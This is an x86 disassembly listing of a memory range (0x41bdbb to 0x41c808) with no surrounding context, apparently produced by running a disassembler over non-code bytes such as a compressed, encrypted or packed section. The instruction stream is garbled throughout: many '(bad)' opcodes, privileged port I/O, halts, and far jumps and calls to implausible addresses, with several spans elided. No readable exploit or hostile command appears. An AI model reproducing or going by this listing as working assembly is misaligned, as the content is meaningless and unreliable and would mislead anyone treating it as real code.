  41bdbb:	push   0xf06ee5cc
  41bdc0:	fild   QWORD PTR [esi-0x72]
  41bdc3:	pop    esi
  41bdc4:	enter  0xc31,0x63
  41bdc8:	fist   WORD PTR [ebx]
  41bdca:	fnclex 
  41bdcc:	pop    ebx
  41bdcd:	jmp    0xcb7e:0x249727ab
  41bdd4:	xchg   ecx,eax
  41bdd5:	dec    edi
  41bdd6:	scas   eax,DWORD PTR es:[edi]
  41bdd7:	xor    BYTE PTR [ecx],al
  41bdd9:	add    bh,BYTE PTR [esi-0x503e01eb]
  41bddf:	clc    
  41bde0:	aas    
  41bde1:	hlt    
  41bde2:	xlat   BYTE PTR ds:[ebx]
  41bde3:	inc    ebp
  41bde4:	jns    0x41bd67
  41bde6:	jo     0x41be1d
  41bde8:	mov    bh,0x4b
  41bdea:	repnz in eax,dx
  41bdec:	fldcw  WORD PTR [edi]
  41bdee:	mov    edi,0x625a8d5
  41bdf3:	lahf   
  41bdf4:	ss scas al,BYTE PTR es:[edi]
  41bdf6:	not    esp
  41bdf8:	jnp    0x41be65
  41bdfa:	or     ebx,DWORD PTR [ebx+esi*2-0x50]
  41bdfe:	mov    BYTE PTR [ebp+0x2b],0x54
  41be02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be03:	lock adc al,0xf7
  41be06:	in     al,0x29
  41be08:	sub    bl,BYTE PTR [ebp-0x29]
  41be0b:	cmp    ah,BYTE PTR [esp+ebp*2-0x41e635c8]
  41be12:	test   BYTE PTR [esi+ebx*4-0x6af6dfe9],cl
  41be19:	fldcw  WORD PTR [eax-0x6b]
  41be1c:	ret    
  41be1d:	push   ds
  41be1e:	add    DWORD PTR [ecx+ecx*4],ecx
  41be21:	lahf   
  41be22:	dec    edi
  41be23:	xor    DWORD PTR [edx-0x1e],0x513e0f9e
  41be2a:	arpl   WORD PTR [edx+0x34],cx
  41be2d:	xchg   esp,eax
  41be2e:	test   BYTE PTR [edi+ecx*8+0x3f3fb9a0],bl
  41be35:	rcl    esp,cl
  41be37:	cdq    
  41be38:	stos   DWORD PTR es:[edi],eax
  41be39:	clc    
  41be3a:	pushf  
  41be3b:	scas   al,BYTE PTR es:[edi]
  41be3c:	mov    bh,0xe7
  41be3e:	cmp    BYTE PTR [esi+0x79f3],dh
	...
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	syscall 
  41bec1:	dec    ebx
  41bec2:	rcr    DWORD PTR [ecx+0x12d9e],1
  41bec8:	test   BYTE PTR [eax],0x0
  41becb:	add    BYTE PTR [ecx-0x24a47cc1],dl
  41bed1:	stos   BYTE PTR es:[edi],al
  41bed2:	pop    edi
  41bed3:	sub    eax,0x79fef15a
  41bed8:	shl    ecx,cl
  41beda:	jp     0x41beef
  41bedc:	pushf  
  41bedd:	call   0xa19c65fa
  41bee2:	xor    DWORD PTR [ecx+0x5889c446],ebp
  41bee8:	sbb    DWORD PTR [edx+0x63d97ee2],0x3e
  41beef:	bound  ebx,QWORD PTR [ecx-0x21]
  41bef2:	repnz ficomp DWORD PTR [esp+edi*4+0x22]
  41bef7:	out    0x5d,eax
  41bef9:	pop    ebp
  41befa:	adc    ch,dl
  41befc:	mov    eax,ds:0x93f1c13c
  41bf01:	ret    0xb133
  41bf04:	dec    esp
  41bf05:	outs   dx,BYTE PTR ds:[esi]
  41bf06:	push   es
  41bf07:	jp     0x41bee8
  41bf09:	ret    
  41bf0a:	leave  
  41bf0b:	push   esp
  41bf0c:	adc    eax,0xd27202dc
  41bf11:	dec    ecx
  41bf12:	pop    ecx
  41bf13:	in     eax,dx
  41bf14:	xchg   ecx,eax
  41bf15:	out    0xa7,eax
  41bf17:	xchg   DWORD PTR [ecx],esi
  41bf19:	test   al,0x2
  41bf1b:	mov    ch,0xdf
  41bf1d:	cmp    bl,BYTE PTR [ecx]
  41bf1f:	mov    ds,edi
  41bf21:	adc    DWORD PTR [edi-0x414ec356],0x8b0cadb3
  41bf2b:	inc    ebx
  41bf2c:	sbb    al,0xc
  41bf2e:	or     edi,DWORD PTR [esi+0x41]
  41bf31:	xchg   ebx,eax
  41bf32:	dec    eax
  41bf33:	ss mov cl,0xe3
  41bf36:	loopne 0x41bf84
  41bf38:	icebp  
  41bf39:	pushf  
  41bf3a:	push   ebp
  41bf3b:	popa   
  41bf3c:	addr16 mov dh,0xf1
  41bf3f:	loop   0x41bef3
  41bf41:	test   eax,0x97320a20
  41bf46:	dec    esi
  41bf47:	jmp    0x41bf0e
  41bf49:	les    ebp,FWORD PTR [edx]
  41bf4b:	daa    
  41bf4c:	popa   
  41bf4d:	inc    edi
  41bf4e:	jbe    0x41bf3c
  41bf50:	sbb    al,0xd1
  41bf52:	xor    al,0x4e
  41bf54:	xor    eax,0xcd288ae4
  41bf59:	inc    edi
  41bf5a:	ret    
  41bf5b:	xchg   ebp,eax
  41bf5c:	call   0xd23:0x31bb95e1
  41bf63:	jnp    0x41bf76
  41bf65:	aaa    
  41bf66:	and    eax,0x98e35dd1
  41bf6b:	mov    ebp,0xc58ba98d
  41bf70:	mov    ebx,edx
  41bf72:	out    0xd8,eax
  41bf74:	fist   WORD PTR [edi]
  41bf76:	mov    ebx,0xe60724c3
  41bf7b:	xor    esi,DWORD PTR [eax+0x3dff3073]
  41bf81:	(bad)  
  41bf82:	enter  0xdd16,0x68
  41bf86:	cwde   
  41bf87:	jg     0x41c000
  41bf89:	push   edi
  41bf8a:	fild   DWORD PTR [edi]
  41bf8c:	popf   
  41bf8d:	cmp    eax,0x643b72ab
  41bf92:	sahf   
  41bf93:	cmp    al,0x4a
  41bf95:	xchg   edi,eax
  41bf96:	jl     0x41bf60
  41bf98:	add    al,0x3d
  41bf9a:	jmp    0x50cc0efb
  41bf9f:	stos   DWORD PTR es:[edi],eax
  41bfa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfa1:	dec    edi
  41bfa2:	sar    DWORD PTR [ebp+ebp*2-0x70fd208e],1
  41bfa9:	cmp    eax,0x10557f6f
  41bfae:	mov    edi,DWORD PTR ds:0x18b6a65
  41bfb4:	leave  
  41bfb5:	imul   esi
  41bfb7:	sbb    ah,BYTE PTR [eax+0x194b1a64]
  41bfbd:	aaa    
  41bfbe:	xchg   edi,eax
  41bfbf:	loop   0x41bfd9
  41bfc1:	data16 add BYTE PTR [eax],al
	...
  41c034:	(bad)  
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x33bb9a81]
  41c041:	inc    esi
  41c042:	mov    al,ds:0x12e94c0
  41c047:	add    dh,dh
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    BYTE PTR [edx-0x5d],al
  41c04e:	clc    
  41c04f:	stos   DWORD PTR es:[edi],eax
  41c050:	cmp    eax,0xa8ff24d4
  41c055:	push   eax
  41c056:	cs cli 
  41c058:	pop    ebp
  41c059:	jbe    0x41c09f
  41c05b:	push   ds
  41c05c:	shr    ch,0x8f
  41c05f:	fdivp  st(3),st
  41c061:	jno    0x41c0c6
  41c063:	xchg   ecx,eax
  41c064:	inc    ebp
  41c065:	js     0x41c043
  41c067:	adc    esp,DWORD PTR [edx]
  41c069:	cli    
  41c06a:	mov    ah,0x3d
  41c06c:	aas    
  41c06d:	mov    esp,0x8499c550
  41c072:	scas   al,BYTE PTR es:[edi]
  41c073:	pusha  
  41c074:	lahf   
  41c075:	push   0x2c
  41c077:	les    ebp,FWORD PTR [esi]
  41c079:	xlat   BYTE PTR ds:[ebx]
  41c07a:	les    ecx,FWORD PTR [edx+0x1525391a]
  41c080:	sti    
  41c081:	mov    BYTE PTR [ebp-0x5d99d070],bl
  41c087:	(bad)  
  41c088:	iret   
  41c089:	in     eax,dx
  41c08a:	shl    DWORD PTR [esi+0x17],1
  41c08d:	push   edx
  41c08e:	imul   ebp
  41c090:	int3   
  41c091:	pop    ebx
  41c092:	push   edi
  41c093:	fisttp QWORD PTR ds:0xe49700a9
  41c099:	add    eax,0x4cab17ae
  41c09e:	ret    
  41c09f:	push   es
  41c0a0:	jmp    0x41c0c7
  41c0a2:	xor    eax,0x9460504d
  41c0a7:	jbe    0x41c061
  41c0a9:	loope  0x41c0c9
  41c0ab:	sub    ebx,DWORD PTR [edx]
  41c0ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ae:	mov    edx,0x3ebe243c
  41c0b3:	repz loopne 0x41c06c
  41c0b6:	inc    eax
  41c0b7:	pusha  
  41c0b8:	mov    al,0x2f
  41c0ba:	sahf   
  41c0bb:	jmp    0x7e18:0x58cd9496
  41c0c2:	sub    BYTE PTR [edi+0x67],bh
  41c0c5:	jno    0x41c05d
  41c0c7:	lods   eax,DWORD PTR ds:[esi]
  41c0c8:	mov    edx,0xafce960d
  41c0cd:	setae  BYTE PTR [ebx]
  41c0d0:	pop    es
  41c0d1:	int3   
  41c0d2:	cli    
  41c0d3:	xor    BYTE PTR [edx],0x7c
  41c0d6:	stos   BYTE PTR es:[edi],al
  41c0d7:	mov    al,0x6a
  41c0d9:	in     al,0xe1
  41c0db:	popa   
  41c0dc:	in     eax,0x57
  41c0de:	lahf   
  41c0df:	cmp    ebp,eax
  41c0e1:	in     eax,dx
  41c0e2:	mov    ds:0xe1c7b732,eax
  41c0e7:	cmp    eax,0x2e656a2b
  41c0ec:	xchg   edi,eax
  41c0ed:	inc    edi
  41c0ee:	out    0xce,al
  41c0f0:	push   ebx
  41c0f1:	xor    cl,BYTE PTR [ebp+0x6a690903]
  41c0f7:	dec    edi
  41c0f8:	inc    ebx
  41c0f9:	push   ebx
  41c0fa:	pop    es
  41c0fb:	mov    ecx,edx
  41c0fd:	dec    esp
  41c0fe:	hlt    
  41c0ff:	ror    BYTE PTR [ebp+0x6],1
  41c102:	inc    esp
  41c103:	dec    edx
  41c104:	mov    esp,0x21b62aed
  41c109:	inc    ecx
  41c10a:	xchg   eax,esi
  41c10c:	imul   esp,DWORD PTR [edx+esi*1],0x3e
  41c110:	adc    DWORD PTR [ecx],ebp
  41c112:	push   ss
  41c113:	test   eax,0x9214c7db
  41c118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c119:	cli    
  41c11a:	xchg   DWORD PTR [edx-0x57f0815d],eax
  41c120:	mov    bl,0xcd
  41c122:	jae    0x41c16e
  41c124:	aad    0x90
  41c126:	addr16 push ss
  41c128:	xor    dl,BYTE PTR [ebx]
  41c12a:	call   0xfc8e30f4
  41c12f:	scas   al,BYTE PTR es:[edi]
  41c130:	iret   
  41c131:	mov    eax,ds:0x76fc073a
  41c136:	adc    dh,bl
  41c138:	test   DWORD PTR [ecx-0x54],ebx
  41c13b:	push   esp
  41c13c:	sbb    DWORD PTR [ebp-0x12],ebp
  41c13f:	stos   DWORD PTR es:[edi],eax
  41c140:	pusha  
  41c141:	test   DWORD PTR [eax],0x0
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x293f6a10
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    BYTE PTR [ebx],bl
  41c1cd:	pop    ebx
  41c1ce:	jae    0x41c234
  41c1d0:	mov    esi,0x9facda2e
  41c1d5:	push   edx
  41c1d6:	cmp    BYTE PTR [edx+edi*8],bh
  41c1d9:	or     al,0xb3
  41c1db:	sbb    eax,0x5984304f
  41c1e0:	jge    0x41c185
  41c1e2:	mov    eax,0x3e1bac2b
  41c1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1e8:	inc    eax
  41c1e9:	pop    ebp
  41c1ea:	retf   0xfa34
  41c1ed:	adc    al,al
  41c1ef:	sub    DWORD PTR [edx-0x1d],ebx
  41c1f2:	stc    
  41c1f3:	(bad)
  41c1f6:	jle    0x41c1d5
  41c1f8:	mov    ebp,0x1eae2aab
  41c1fd:	push   cs
  41c1fe:	out    0x94,al
  41c200:	lock sbb al,0x37
  41c203:	ds jecxz 0x41c1f7
  41c206:	and    al,0x74
  41c208:	pop    esi
  41c209:	jge    0x41c1e4
  41c20b:	lods   eax,DWORD PTR ds:[esi]
  41c20c:	les    ebx,FWORD PTR [ebp-0x2a69a38d]
  41c212:	rcl    BYTE PTR [edx],1
  41c214:	mov    ds:0x568bc5d2,al
  41c219:	or     bh,dh
  41c21b:	add    eax,0x1b845ea
  41c220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c221:	sub    eax,0x813342c7
  41c226:	fs mov esp,0xf77d5475
  41c22c:	out    0x83,eax
  41c22e:	sub    eax,0xb147caf1
  41c233:	dec    edi
  41c234:	loope  0x41c234
  41c236:	inc    ecx
  41c237:	mov    eax,ds:0x514148f
  41c23c:	jns    0x41c2b8
  41c23e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c23f:	es stc 
  41c241:	(bad)  
  41c242:	fisttp WORD PTR [ebp+0x6a097069]
  41c248:	dec    edx
  41c249:	pop    edi
  41c24a:	adc    BYTE PTR [eax+0x4a],bl
  41c24d:	adc    DWORD PTR [edx+0x760ebe6],esi
  41c253:	je     0x41c208
  41c255:	mov    ss,WORD PTR [edx+0x219a7d22]
  41c25b:	and    DWORD PTR [ebp-0x2cba0fce],ebx
  41c261:	ret    0xc916
  41c264:	mov    ebp,0x848f42e7
  41c269:	mov    dl,0x31
  41c26b:	xor    bl,BYTE PTR [edx-0xe956e49]
  41c271:	jae    0x41c2c5
  41c273:	popf   
  41c274:	rcr    DWORD PTR [edx],0x75
  41c277:	mov    eax,ds:0xa32db2b0
  41c27c:	out    0xed,al
  41c27e:	sub    ecx,0xcc6622c4
  41c284:	push   es
  41c285:	sahf   
  41c286:	jno    0x41c2df
  41c288:	cli    
  41c289:	xchg   BYTE PTR [edi-0x7347465f],al
  41c28f:	clc    
  41c290:	push   ds
  41c291:	sbb    esi,eax
  41c293:	idiv   eax
  41c295:	jmp    0x2ebd:0x70ad6e4a
  41c29c:	jns    0x41c2b1
  41c29e:	mov    edx,0x72cda0e9
  41c2a3:	in     eax,dx
  41c2a4:	jg     0x41c29f
  41c2a6:	add    BYTE PTR [ebx],bl
  41c2a8:	leave  
  41c2a9:	mov    ah,0xc0
  41c2ab:	adc    edx,esi
  41c2ad:	or     bl,BYTE PTR [edi]
  41c2af:	sub    DWORD PTR [ecx+0x30],esp
  41c2b2:	retf   
  41c2b3:	xchg   esp,eax
  41c2b4:	les    eax,FWORD PTR [esi-0x20]
  41c2b7:	dec    ebp
  41c2b8:	into   
  41c2b9:	mov    esi,0xc30ebc43
  41c2be:	mov    eax,ds:0xbd65ad
	...
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	add    eax,0x802fe757
  41c345:	xor    BYTE PTR [ecx],al
  41c347:	add    dh,dh
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [ecx],bl
  41c34d:	aam    0x7d
  41c34f:	aas    
  41c350:	sbb    ebp,DWORD PTR [eax-0xefdd3ec]
  41c356:	(bad)  
  41c357:	cs cs jns 0x2827442b
  41c35f:	jl     0x41c320
  41c361:	push   esp
  41c362:	fwait
  41c363:	das    
  41c364:	xchg   edi,eax
  41c365:	push   edi
  41c366:	loope  0x41c33d
  41c368:	(bad)  
  41c369:	add    al,0x72
  41c36b:	sub    eax,0x1f4e2b54
  41c370:	xchg   esp,eax
  41c371:	in     al,dx
  41c372:	pop    ebp
  41c373:	dec    ecx
  41c374:	in     eax,dx
  41c375:	lahf   
  41c376:	aaa    
  41c377:	xchg   ecx,eax
  41c378:	loop   0x41c338
  41c37a:	sbb    bl,ah
  41c37c:	xor    DWORD PTR [esi+0x73],edx
  41c37f:	retf   
  41c380:	rcl    BYTE PTR [edi-0x2bf5007b],0x8b
  41c387:	pop    eax
  41c388:	ret    0x6e2a
  41c38b:	xor    BYTE PTR ds:0xf5c513cb,dl
  41c391:	mov    fs,edx
  41c393:	add    DWORD PTR [edx-0x46],0x8d59f052
  41c39a:	push   cs
  41c39b:	mov    dl,0x67
  41c39d:	xchg   edi,eax
  41c39e:	into   
  41c39f:	leave  
  41c3a0:	pop    esp
  41c3a1:	lea    esp,[ecx+0xd]
  41c3a4:	jle    0x41c3c9
  41c3a6:	or     edx,DWORD PTR [edi+ecx*1]
  41c3a9:	leave  
  41c3aa:	clc    
  41c3ab:	int    0xaa
  41c3ad:	and    BYTE PTR [esi-0x75],ch
  41c3b0:	addr16 popf 
  41c3b2:	sahf   
  41c3b3:	retf   
  41c3b4:	jb     0x41c35f
  41c3b6:	rcl    DWORD PTR [edx+ebp*4+0x6590b4d2],cl
  41c3bd:	neg    BYTE PTR [esi]
  41c3bf:	(bad)  
  41c3c0:	out    dx,eax
  41c3c1:	ins    DWORD PTR es:[edi],dx
  41c3c2:	cdq    
  41c3c3:	arpl   bx,si
  41c3c5:	mov    ch,0xd8
  41c3c7:	int3   
  41c3c8:	cwde   
  41c3c9:	pop    ss
  41c3ca:	mov    edx,0xde5770b0
  41c3cf:	popa   
  41c3d0:	sbb    ah,BYTE PTR [edi]
  41c3d2:	repz repnz xor eax,0x4921bff6
  41c3d9:	cmp    dl,BYTE PTR [esi+0xa]
  41c3dc:	or     DWORD PTR [eax-0x1bae621c],ecx
  41c3e2:	dec    ebx
  41c3e3:	add    eax,0xacdd0844
  41c3e8:	pop    ecx
  41c3e9:	add    BYTE PTR [ecx],cl
  41c3eb:	lds    ecx,FWORD PTR [edx-0x4883255e]
  41c3f1:	test   BYTE PTR [ecx+0x7966dff2],0x39
  41c3f8:	fld    DWORD PTR [eax+0x48]
  41c3fb:	fisttp WORD PTR [edx+0x14351d32]
  41c401:	xchg   esp,eax
  41c402:	mov    fs,WORD PTR [edi-0x6d842278]
  41c408:	inc    eax
  41c409:	cmc    
  41c40a:	clc    
  41c40b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c40c:	mov    ebp,0x1d42048
  41c411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c412:	gs jno 0x41c3a4
  41c415:	xchg   esp,eax
  41c416:	push   es
  41c417:	mov    dl,0x9e
  41c419:	jae    0x41c3e3
  41c41b:	xlat   BYTE PTR ds:[ebx]
  41c41c:	ins    DWORD PTR es:[edi],dx
  41c41d:	loope  0x41c435
  41c41f:	or     eax,0x79fa6b81
  41c424:	mov    bl,0xac
  41c426:	imul   BYTE PTR [edx+0x7]
  41c429:	arpl   bx,sp
  41c42b:	mov    edx,0xec643e93
  41c430:	pop    edi
  41c431:	xchg   ebx,eax
  41c432:	fisubr DWORD PTR [ecx-0x575c307a]
  41c438:	mov    edi,0xb8c52396
  41c43d:	push   ebp
  41c43e:	pop    ecx
  41c43f:	sub    al,0xc8
  41c441:	data16 add BYTE PTR [eax],al
	...
  41c4b4:	aam    0xec
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx-0x28e3c324]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    BYTE PTR [ecx],bl
  41c4cd:	(bad)  
  41c4ce:	repz cmp esp,eax
  41c4d1:	fistp  DWORD PTR [ecx-0x49aa2cfd]
  41c4d7:	xchg   esp,eax
  41c4d8:	out    0x42,al
  41c4da:	add    ecx,DWORD PTR [edx-0x51189609]
  41c4e0:	dec    ecx
  41c4e1:	push   edx
  41c4e2:	in     eax,dx
  41c4e3:	lods   al,BYTE PTR ds:[esi]
  41c4e4:	retf   
  41c4e5:	push   ebx
  41c4e6:	ins    DWORD PTR es:[edi],dx
  41c4e7:	jo     0x41c529
  41c4e9:	push   es
  41c4ea:	aaa    
  41c4eb:	jg     0x41c4ba
  41c4ed:	stos   BYTE PTR es:[edi],al
  41c4ee:	aaa    
  41c4ef:	pop    ds
  41c4f0:	cmp    eax,0x73484d82
  41c4f5:	iret   
  41c4f6:	mov    DWORD PTR [edi],edi
  41c4f8:	mov    bh,0x16
  41c4fa:	ins    DWORD PTR es:[edi],dx
  41c4fb:	lahf   
  41c4fc:	aad    0xe5
  41c4fe:	cdq    
  41c4ff:	sub    BYTE PTR [esp+ecx*1+0x49],dh
  41c503:	lahf   
  41c504:	adc    bh,BYTE PTR [esi]
  41c506:	and    edi,ebx
  41c508:	mov    edx,edx
  41c50a:	mov    edi,0xe5ecac68
  41c50f:	(bad)  
  41c510:	jmp    0x41c4fb
  41c512:	and    DWORD PTR [ebx],ecx
  41c514:	add    ecx,DWORD PTR [ecx-0x62776bbd]
  41c51a:	jp     0x41c543
  41c51c:	mov    bh,0xb
  41c51e:	pop    ebx
  41c51f:	pusha  
  41c520:	add    ah,BYTE PTR [edi-0x6184dd91]
  41c526:	test   al,0xcf
  41c528:	inc    ebp
  41c529:	cwde   
  41c52a:	out    dx,eax
  41c52b:	sub    DWORD PTR [ecx],ebx
  41c52d:	xchg   DWORD PTR [esi+ecx*1-0x8d49b01],ecx
  41c534:	fnstcw WORD PTR [ecx]
  41c536:	ins    BYTE PTR es:[edi],dx
  41c537:	dec    edi
  41c538:	dec    esp
  41c539:	repnz ror BYTE PTR ds:0x22ef91b4,0x9a
  41c541:	xchg   esi,eax
  41c542:	adc    eax,0x6ab32d05
  41c547:	out    dx,eax
  41c548:	aas    
  41c549:	xor    ch,BYTE PTR [ebp+0x45]
  41c54c:	jl     0x41c4d4
  41c54e:	mov    ch,0x4d
  41c550:	pop    eax
  41c551:	imul   edi,esp,0xa9dbe4aa
  41c557:	or     eax,0xbfd157fa
  41c55c:	adc    ch,BYTE PTR [edi-0x51]
  41c55f:	mov    eax,0xd39f1e8
  41c564:	rol    BYTE PTR [ebx+0x6d6d46b2],cl
  41c56a:	add    BYTE PTR [eax-0xb1cf2f5],ah
  41c570:	pop    ebx
  41c571:	cmp    ebp,edx
  41c573:	mov    ds:0xa3fc3872,al
  41c578:	push   eax
  41c579:	das    
  41c57a:	cli    
  41c57b:	mov    bl,BYTE PTR [eax+0x1533f0db]
  41c581:	(bad)  
  41c582:	in     eax,dx
  41c583:	or     BYTE PTR [esi+0x7a],ch
  41c586:	cmp    ch,0x70
  41c589:	ja     0x41c58b
  41c58b:	sub    BYTE PTR [ebx],0x7f
  41c58e:	push   es
  41c58f:	inc    ecx
  41c590:	add    edi,0xffffffdf
  41c593:	mov    DWORD PTR [ecx],ebp
  41c595:	outs   dx,DWORD PTR ds:[esi]
  41c596:	stc    
  41c597:	jecxz  0x41c5ec
  41c599:	cmp    esp,eax
  41c59b:	ds dec edx
  41c59d:	xchg   ebx,eax
  41c59e:	pop    ds
  41c59f:	les    edx,FWORD PTR [esi]
  41c5a1:	or     ah,bh
  41c5a3:	mov    DWORD PTR [ebp-0x5e],ecx
  41c5a6:	lea    edx,[edx]
  41c5a8:	daa    
  41c5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5aa:	xchg   DWORD PTR [ecx],esp
  41c5ac:	dec    eax
  41c5ad:	push   edx
  41c5ae:	mov    cl,0xc5
  41c5b0:	inc    edi
  41c5b1:	sbb    DWORD PTR [esi],eax
  41c5b3:	inc    edx
  41c5b4:	sbb    DWORD PTR [ebx-0x54],ecx
  41c5b7:	cmp    al,BYTE PTR [ecx-0x2e]
  41c5ba:	mov    al,0x22
  41c5bc:	out    0xab,eax
  41c5be:	clc    
  41c5bf:	out    dx,eax
  41c5c0:	dec    edx
  41c5c1:	push   edx
	...
  41c632:	add    BYTE PTR [eax],al
  41c634:	test   al,0x63
  41c636:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41c63c:	out    dx,eax
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	into   
  41c641:	(bad)  
  41c642:	cmp    ebp,DWORD PTR [esp+ebp*2]
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    dh,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    al,cl
  41c64d:	and    eax,0xf49a49f2
  41c652:	and    DWORD PTR [esi+edx*4-0x4dfffc6d],esp
  41c659:	(bad)  
  41c65a:	pop    edx
  41c65b:	add    ebp,0x88b2d8b4
  41c661:	add    BYTE PTR [edi],al
  41c663:	sbb    eax,0x6e045946
  41c668:	and    al,0xe5
  41c66a:	dec    ecx
  41c66b:	popf   
  41c66c:	out    dx,al
  41c66d:	dec    esi
  41c66e:	add    BYTE PTR [eax+esi*2-0x7ebea4cc],ah
  41c675:	dec    eax
  41c676:	pop    ss
  41c677:	push   eax
  41c678:	call   0x3162:0x62cabfe4
  41c67f:	sub    al,0x40
  41c681:	sub    eax,0x8cfbf886
  41c686:	sti    
  41c687:	lods   eax,DWORD PTR ds:[esi]
  41c688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c689:	cmp    edx,DWORD PTR [ecx+0x5f]
  41c68c:	stos   BYTE PTR es:[edi],al
  41c68d:	out    0x3a,al
  41c68f:	cmp    ebp,ecx
  41c691:	pop    es
  41c692:	fs push 0x332b6cd2
  41c698:	sub    al,0xab
  41c69a:	icebp  
  41c69b:	push   ss
  41c69c:	cli    
  41c69d:	stos   DWORD PTR es:[edi],eax
  41c69e:	dec    ebp
  41c69f:	inc    edi
  41c6a0:	inc    edx
  41c6a1:	mov    bh,BYTE PTR [edx-0x67]
  41c6a4:	fistp  DWORD PTR [eax-0x1a31019c]
  41c6aa:	int    0x47
  41c6ac:	in     al,dx
  41c6ad:	daa    
  41c6ae:	mov    DWORD PTR [ecx+0x801339c],esi
  41c6b4:	es fucomp st(5)
  41c6b7:	in     al,dx
  41c6b8:	jg     0x41c6d9
  41c6ba:	lea    ebp,[ebp-0x22]
  41c6bd:	push   edx
  41c6be:	ret    0x95b5
  41c6c1:	loopne 0x41c6b9
  41c6c3:	jle    0x41c681
  41c6c5:	jne    0x41c705
  41c6c7:	cs push ebp
  41c6c9:	aam    0x2a
  41c6cb:	mov    al,0xe1
  41c6cd:	jmp    0x9cad2fbc
  41c6d2:	ds aad 0xf9
  41c6d5:	pop    ebp
  41c6d6:	out    dx,eax
  41c6d7:	or     al,0x52
  41c6d9:	dec    edi
  41c6da:	or     BYTE PTR [eax-0x385157be],dh
  41c6e0:	mov    dl,0xdb
  41c6e2:	ja     0x41c681
  41c6e4:	mov    esp,0x52af89aa
  41c6e9:	int    0xb2
  41c6eb:	dec    ebp
  41c6ec:	in     al,0xfd
  41c6ee:	(bad)  
  41c6ef:	repz inc ecx
  41c6f1:	xchg   DWORD PTR [edx+ebx*8],edx
  41c6f4:	or     DWORD PTR [edi-0x6713a529],eax
  41c6fa:	sbb    BYTE PTR [esi+0x19],ch
  41c6fd:	sbb    esp,DWORD PTR [eax+0x52]
  41c700:	jne    0x41c6ab
  41c702:	add    al,0xef
  41c704:	repz xchg ebp,eax
  41c706:	sub    al,0x68
  41c708:	xor    eax,0x73527904
  41c70d:	mov    dh,ch
  41c70f:	leave  
  41c710:	sar    DWORD PTR [edi+0x22ec8491],1
  41c716:	leave  
  41c717:	inc    ebx
  41c718:	xor    eax,0xf8858357
  41c71d:	cmp    BYTE PTR [esi],dh
  41c71f:	mov    al,ds:0x78a14cb6
  41c724:	adc    al,0x14
  41c727:	push   eax
  41c728:	xchg   ebp,eax
  41c729:	or     ecx,edx
  41c72b:	push   esp
  41c72c:	outs   dx,BYTE PTR ds:[esi]
  41c72d:	sub    BYTE PTR [ebx+0x7735c],cl
  41c733:	jmp    0x669d:0x5b7817e0
  41c73a:	push   esp
  41c73b:	add    eax,0xcd305812
  41c740:	mov    al,0x14
	...
  41c7b2:	add    BYTE PTR [eax],al
  41c7b4:	mov    bh,ah
  41c7b6:	(bad)  
  41c7b7:	dec    esi
  41c7b8:	idiv   DWORD PTR [edi-0x75]
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x4c420054
  41c7c3:	push   ds
  41c7c4:	bound  esi,QWORD PTR [ebx]
  41c7c6:	add    DWORD PTR [eax],eax
  41c7c8:	test   BYTE PTR [eax],0x0
  41c7cb:	add    al,dl
  41c7cd:	mov    bh,0xae
  41c7cf:	push   esp
  41c7d0:	leave  
  41c7d1:	pop    ebx
  41c7d2:	pop    ds
  41c7d3:	call   0x4b27:0x96304010
  41c7da:	int    0xb
  41c7dc:	mov    ebp,DWORD PTR [esi-0x136949c]
  41c7e2:	jae    0x41c774
  41c7e4:	shl    cl,0xac
  41c7e7:	pop    ss
  41c7e8:	jbe    0x41c822
  41c7ea:	xchg   edi,eax
  41c7eb:	pop    ebp
  41c7ec:	std    
  41c7ed:	daa    
  41c7ee:	mov    cl,0x33
  41c7f0:	mov    esi,0x831d2b17
  41c7f5:	das    
  41c7f6:	push   cs
  41c7f7:	fisub  DWORD PTR [ebp-0x10]
  41c7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7fb:	jb     0x41c80b
  41c7fd:	sbb    BYTE PTR [ebp-0x34],al
  41c800:	cmp    ebx,ecx
  41c802:	lahf   
  41c803:	push   cs
  41c804:	push   0x1d
  41c806:	pop    ds
  41c807:	pop    eax
  41c808:	addr16 dec edx
